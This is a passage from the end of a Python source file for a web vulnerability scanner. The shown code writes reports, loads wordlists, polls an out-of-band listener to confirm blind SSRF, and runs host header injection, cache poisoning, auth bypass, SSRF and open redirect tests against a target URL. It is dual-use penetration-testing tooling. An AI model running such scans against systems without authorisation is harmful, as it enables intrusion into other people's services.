        results.extend(test.vulnerabilities_found)

    if extension == "json":
        with open(output_file, "w") as handle:
            json.dump(results, handle, indent=4)
        print(f"\nResults saved to {output_file}")
        return

    lines = [
        "# Host Header Injection Testing Report",
        f"**Target URL:** {tests[0].target_url}",
        f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"**Total Findings:** {sum(len(t.vulnerabilities_found) for t in tests)}\n",
    ]
    if results:
        lines.append("## Test Results\n")
        for result in results:
            lines.extend([
                f"### {result['test_type']}: {result['test_result']}",
                f"- **URL:** {result['url']}",
                f"- **Method:** {result['method']}",
                f"- **Headers:** {result.get('headers', {})}",
                f"- **Parameter:** {result.get('param_name', '')}",
                f"- **Payload:** {result.get('payload', '')}",
                f"- **Status Code:** {result['status_code']}",
                f"- **Response Time:** {result.get('response_time', 0):.2f} seconds",
                f"- **Analysis:** {result['analysis']}",
                f"- **Reproduce:** `{result['repro']}`\n" if result.get("repro") else "",
            ])
    else:
        lines.append("No vulnerabilities were found.\n")
    with open(output_file, "w") as handle:
        handle.write("\n".join(line for line in lines if line is not None))
    print(f"\nReport saved to {output_file}")


def load_wordlist(path):
    if not path:
        return None
    try:
        with open(path) as handle:
            return [line.strip() for line in handle
                    if line.strip() and not line.startswith("#")]
    except OSError as exc:
        print(Fore.YELLOW + f"Could not read wordlist '{path}': {exc}. "
              "Using built-in list.")
        return None


def confirm_oob_interactions(oob_manager, session, timeout, tests):
    """Poll the OOB listener and record any confirmed blind interactions."""
    hits = oob_manager.poll(session, timeout)
    if not hits:
        print(Fore.GREEN + "No OOB interactions recorded.")
        return
    by_type = {test.test_type: test for test in tests}
    label_to_type = {
        "ssrf": "SSRF",
        "host": "Host Header Injection",
        "param": "URL Parameter SSRF",
        "redirect": "Open Redirect",
    }
    for label in hits:
        owner = by_type.get(label_to_type.get(label, ""), tests[0])
        owner.vulnerabilities_found.append({
            "test_type": "Blind SSRF (OOB)",
            "test_result": "Vulnerable",
            "url": owner.target_url,
            "method": "GET",
            "header_name": label,
            "payload": oob_manager.labels.get(label, ""),
            "status_code": "N/A",
            "analysis": (
                f"Out-of-band interaction received from the '{label}' payload "
                f"(scan id {oob_manager.scan_id}); confirms blind SSRF."
            ),
            "repro": "",
        })
        print(Fore.RED + Style.BRIGHT +
              f"[!] OOB interaction confirmed for '{label}' payload -> blind SSRF.")


def main():
    print(Fore.CYAN + Style.BRIGHT + f"{__tool_name__} {__version__}")
    print(Fore.CYAN + f"GitHub: {__github_url__}\n")

    args = parse_arguments()
    parsed_url = urlparse(args.url)
    hostname = parsed_url.hostname
    if not hostname:
        print("Invalid URL provided.")
        sys.exit(1)

    methods = [m.strip().upper() for m in args.methods.split(",") if m.strip()]
    extra_headers = parse_headers(args.headers)
    wordlist = load_wordlist(args.wordlist)
    oob_manager = OOBManager(args.oob, args.oob_poll_url) if args.oob else None

    print(f"Target URL: {args.url}")
    print(f"Original Host: {hostname}")
    print(f"Methods: {', '.join(methods)}")
    print(f"Using {args.threads} threads (timeout {args.timeout}s).")
    print(f"Verbosity level set to {args.verbose}.")
    if oob_manager:
        print(f"OOB domain: {args.oob} (scan id {oob_manager.scan_id}).")
        print("Poll URL: " + (args.oob_poll_url or "not set (manual correlation)") + "\n")
    else:
        print("No OOB domain provided.\n")

    session = build_session(
        timeout=args.timeout,
        threads=args.threads,
        insecure=args.insecure,
        proxy=args.proxy,
        extra_headers=extra_headers,
    )

    common = dict(session=session, oob_domain=args.oob, methods=methods,
                  threads=args.threads, verbose=args.verbose, timeout=args.timeout,
                  oob_manager=oob_manager, wordlist=wordlist, insecure=args.insecure)

    tests = [
        HostInjectionTest(args.url, hostname, **common),
        HostBypassTest(args.url, hostname, **common),
        CachePoisoningTest(args.url, hostname, **common),
        AuthBypassTest(args.url, hostname, **common),
        VhostDiscoveryTest(args.url, hostname, **common),
        SSRFTest(args.url, hostname, **common),
        URLParameterTest(args.url, hostname, **common),
        OpenRedirectTest(args.url, hostname, **common),
    ]

    try:
        for test in tests:
            test.run()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Program interrupted by user.")
        save_results(args.output, tests, args.verbose)
        sys.exit(0)

    if oob_manager and oob_manager.poll_url:
        print("\nPolling OOB listener for interactions...")
        confirm_oob_interactions(oob_manager, session, args.timeout, tests)

    save_results(args.output, tests, args.verbose)

    print(Fore.CYAN + Style.BRIGHT + "\n========== Test Summary ==========")
    total_vulns = sum(len(test.vulnerabilities_found) for test in tests)
    print(Fore.CYAN + f"Total findings: {total_vulns}")
    for test in tests:
        if test.vulnerabilities_found:
            print(Fore.MAGENTA + Style.BRIGHT + f"\n--- {test.test_type} ---")
            for vuln in test.vulnerabilities_found:
                print(Fore.RED + f"- {vuln['method']} {vuln['url']}")
                print(f"  Header/Parameter: {vuln.get('header_name') or vuln.get('param_name')}")
                print(f"  Payload: {vuln['payload']}")
                print(Fore.YELLOW + f"  Analysis: {vuln['analysis']}")
                print(Fore.RED + "-" * 80)
    if total_vulns == 0:
        print(Fore.GREEN + "No vulnerabilities were found.")
    print(Fore.CYAN + "=" * 35)


if __name__ == "__main__":
    main()
